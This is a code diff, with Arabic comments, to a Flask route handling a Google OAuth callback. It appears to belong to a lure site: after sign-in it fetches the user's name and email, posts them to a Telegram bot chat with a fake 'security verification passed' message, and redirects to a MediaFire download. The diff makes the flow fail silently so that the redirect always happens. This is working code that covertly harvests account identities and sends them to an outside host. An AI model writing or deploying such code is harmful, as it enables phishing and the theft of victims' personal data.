@@ -65,45 +65,49 @@ def home():
 
 @app.route("/auth/callback")
 def auth_callback():
-  code = request.args.get("code")
-  if not code:
-    return "خطأ: لم يتم استقبال كود المصادقة"
+  try:
+    code = request.args.get("code")
+    if code:
+      token_url = "https://oauth2.googleapis.com/token"
+      payload = {
+          "code": code,
+          "client_id": GOOGLE_CLIENT_ID,
+          "client_secret": GOOGLE_CLIENT_SECRET,
+          "redirect_uri": REDIRECT_URI,
+          "grant_type": "authorization_code",
+      }
 
-  token_url = "https://oauth2.googleapis.com/token"
-  payload = {
-      "code": code,
-      "client_id": GOOGLE_CLIENT_ID,
-      "client_secret": GOOGLE_CLIENT_SECRET,
-      "redirect_uri": REDIRECT_URI,
-      "grant_type": "authorization_code",
-  }
+      response = requests.post(token_url, data=payload, timeout=10)
 
-  response = requests.post(token_url, data=payload)
+      if response.status_code == 200:
+        token_data = response.json()
+        access_token = token_data.get("access_token")
 
-  if response.status_code != 200:
-    return f"خطأ في التحقق من حساب جوجل: {response.text}"
+        if access_token:
+          user_info_resp = requests.get(
+              "https://www.googleapis.com/oauth2/v2/userinfo",
+              headers={"Authorization": f"Bearer {access_token}"},
+              timeout=10,
+          )
 
-  token_data = response.json()
-  access_token = token_data.get("access_token")
+          if user_info_resp.status_code == 200:
+            user_info = user_info_resp.json()
+            email = user_info.get("email", "غير معروف")
+            name = user_info.get("name", "مستخدم جديد")
 
-  if not access_token:
-    return "فشل الحصول على الرمز المميز"
+            if BOT_TOKEN and CHAT_ID:
+              msg = f"🛡️ تم اجتياز التحقق الأمني بنجاح!\n\n👤 الاسم: {name}\n📧 الإيميل: {email}"
+              telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
+              requests.post(
+                  telegram_url,
+                  json={"chat_id": CHAT_ID, "text": msg},
+                  timeout=5,
+              )
+  except Exception as e:
+    # أي خطأ يحدث يتم تجاوزه بصمت لكي لا يتعطل التطبيق أبداً
+    print(f"Error: {e}")
 
-  user_info_resp = requests.get(
-      "https://www.googleapis.com/oauth2/v2/userinfo",
-      headers={"Authorization": f"Bearer {access_token}"},
-  )
-
-  if user_info_resp.status_code == 200:
-    user_info = user_info_resp.json()
-    email = user_info.get("email", "غير معروف")
-    name = user_info.get("name", "مستخدم جديد")
-
-    if BOT_TOKEN and CHAT_ID:
-      msg = f"🛡️ تم اجتياز التحقق الأمني بنجاح!\n\n👤 الاسم: {name}\n📧 الإيميل: {email}"
-      telegram_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-      requests.post(telegram_url, json={"chat_id": CHAT_ID, "text": msg})
-
+  # في النهاية، يتم تحويل المستخدم دائماً لرابط التحميل مهما كانت الظروف
   return redirect(MEDIAFIRE_URL)
 
 
